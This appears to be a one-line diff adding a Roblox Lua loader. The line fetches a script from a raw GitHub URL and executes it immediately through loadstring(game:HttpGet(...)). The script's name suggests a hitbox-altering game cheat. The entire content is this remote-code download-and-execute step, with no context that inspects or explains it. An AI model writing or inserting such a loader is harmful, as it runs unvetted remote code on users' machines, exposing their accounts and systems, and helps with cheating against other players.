@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/hitbox-changes-azure-latch-spam5-0fxk20c5ia66g7.lua"))()
